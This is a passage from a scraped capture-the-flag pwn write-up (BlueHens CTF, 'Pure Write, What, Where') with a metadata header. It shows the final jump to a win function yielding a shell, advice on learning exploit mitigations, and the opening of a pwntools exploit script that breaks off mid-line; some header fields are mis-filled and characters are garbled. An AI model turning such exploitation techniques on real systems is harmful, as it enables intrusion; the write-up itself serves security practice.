@@ -1,0 +1,13 @@
+---
+SOURCE: livesearch
+URL: https://ohwow.lol/posts/bluehensctf/
+CHALLENGE: BlueHens CTF Pwn Write-up: Pure Write, What, Where - ohwow.lol
+EVENT: LiveSearch
+TEAM: N/A
+CATEGORY: other
+DIFFICULTY: Unknown
+PROTECTIONS: None
+KEY_FUNCTIONS: system
+KEY_TECHNIQUE: Knowing why they exist and how to bypass them can make or break your approach.
+---
+ grab your shell! We jump to the win+5 address at 342 and, once again, guess that one byte, hoping for a bit of luck. When it all came together, I was greeted with a nice shell. [ * ] Switching to interactive mode uid = 1000 ( pwnuser ) gid = 1001 ( pwnuser ) groups = 1001 ( pwnuser ) ,1000 ( ctf ) $ ls flag.txt Takeaways This challenge was a fun exerciseânot too intense, but definitely engaging. A question I often get is, âHow do you even know where to start?â Itâs a fair one. If youâre just beginning, Capture the Flags (CTFs) arenât the best place to start. Theyâre fantastic for practicing and pushing yourself once you have a grasp of the fundamentals, but starting here can be overwhelming if you havenât nailed down the basics. My recommendation is to begin by learning about mitigationsâ understanding protections like ASLR and DEP is essential. Knowing why they exist and how to bypass them can make or break your approach. A great resource for learning these mitigations and bypasses is Ir0nstone . Itâs a solid entry point for understanding exploit mitigations and how to approach them. Another option is Ret2System Wargames , which is an incredible intro to binary exploitation. Itâs a paid resource, but itâs worth it if youâre serious about mastering the foundations of exploitation. Finally, practice is everything. Write your own vulnerable C programs, enabling and disabling various mitigations, to see firsthand how they impact your exploitation strategy. Exploit Code from pwn import * exe = context . binary = ELF( 'pwnme' ) # Start the exploit against the target def start (argv = [], * a, ** kw): '''Start the exploit against the target.''' if args . GDB: return gdb . debug([exe . path] + argv, gdbscript = gdbscript, * a, ** kw) else : return process([exe . path] + argv, * a, ** kw) # GDB script for debugging the exploit gdbscript = ''' tbreak vuln b *vuln+82 b *vuln+109 b win continue ''' . format( ** locals()) # Start the process (or remot
